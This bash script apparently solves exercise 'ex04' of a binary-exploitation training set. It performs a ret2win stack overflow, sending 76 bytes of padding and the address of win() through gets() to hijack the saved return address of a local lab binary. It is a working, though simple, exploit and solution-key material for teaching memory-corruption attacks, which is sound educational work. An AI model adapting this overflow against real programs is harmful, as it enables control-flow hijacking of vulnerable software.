#!/usr/bin/env bash
# ex04 — Classic ret2win: gets() overwrites the saved return address
# win() is at 0x080483f4. Padding to saved-EIP = 76 bytes.
# A pty helper is used so puts() flushes before the post-win SIGSEGV kills the process.

set -e
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BIN="$SCRIPT_DIR/bin"
PTY_HELPER="$(dirname "$SCRIPT_DIR")/solutions/run_pty.py"

[[ -x "$BIN" ]] || { echo "[!] binary not found: $BIN"; exit 1; }
[[ -f "$PTY_HELPER" ]] || { echo "[!] run_pty.py not found: $PTY_HELPER"; exit 1; }

echo "[*] ex04 — overwrite saved return address with &win via gets()"
echo "[*] win() : $(nm "$BIN" | awk '/ T win$/{print $1}')"
echo ""

python3 -c "
import sys, struct
sys.stdout.buffer.write(b'A'*76 + struct.pack('<I', 0x080483f4) + b'\n')
" | python3 "$PTY_HELPER" --stdin "$BIN"

echo ""
echo "[*] done."
